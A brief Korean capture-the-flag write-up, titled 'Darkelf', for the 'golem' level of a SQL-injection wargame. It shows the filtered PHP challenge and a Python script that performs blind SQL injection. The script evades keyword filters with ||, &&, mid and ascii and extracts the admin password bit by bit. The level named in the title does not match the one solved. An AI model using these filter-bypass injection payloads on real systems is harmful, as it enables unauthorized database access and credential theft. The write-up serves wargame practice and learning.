
## Darkelf Write-up

### 문제
``` php
<?php  
include "./config.php";  
login_chk();  
dbconnect();  
if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");  
if(preg_match('/or|and|substr\(|=/i', $_GET[pw])) exit("HeHe");  
$query = "select id from prob_golem where id='guest' and pw='{$_GET[pw]}'";  
echo "<hr>query : <strong>{$query}</strong><hr><br>";  
$result = @mysql_fetch_array(mysql_query($query));  
if($result['id']) echo "<h2>Hello {$result[id]}</h2>";  
  
$_GET[pw] = addslashes($_GET[pw]);  
$query = "select pw from prob_golem where id='admin' and pw='{$_GET[pw]}'";  
$result = @mysql_fetch_array(mysql_query($query));  
if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("golem");  
highlight_file(__FILE__);  
?>
```

### Exploit 코드
``` python
import requests

def req(a) :
    url = 'https://los.rubiya.kr/golem_4b5202cfedd8160e73124b5234235ef5.php'
    cookies = {'PHPSESSID' : 'My PHPSESSID'}
    params = {}
    params['pw'] = a
    
    res = requests.get(url, cookies=cookies, params=params)

    if "Hello admin" in res.text :
        return True
    elif "Clear" in res.text :
        return True
    else :
        return False
length = 0
for i in range(20) :
    a = "'||ascii(id)<98&&length(pw)>" + str(i) + "#"
    if not req(a) :
        length = i
        break
print("Key length is %d" % length)

flag = ''
for i in range(length) :
    binary = ''
    for j in range(8) :
        a = "'||ascii(id)<98&&mid(lpad(bin(ascii(mid(pw, " + str(i+1) + ",1))),8,0)," + str(j+1) + ",1)<1#"
        if req(a) :
            binary += '0'
        else :
            binary += '1'
    flag += chr(int(binary, 2))
    print("[%d] %s" % (i+1, flag))

if req(flag) :
    print("[♪] GOLEM Clear")
```
admin의 pw를 알아내야 문제가 풀린다.  
이번 문제에서 `substr` `or` `등호(=)` 가 필터링 되어 있다.  
substr 대신 mid, ord 대신 ascii, 등호 대신 부등호로 대신 했다.  
`id = 'admin'`도 필터링에 걸리기 때문에 `ascii(id) < 98`을 이용해 admin과 guest를 구분했다.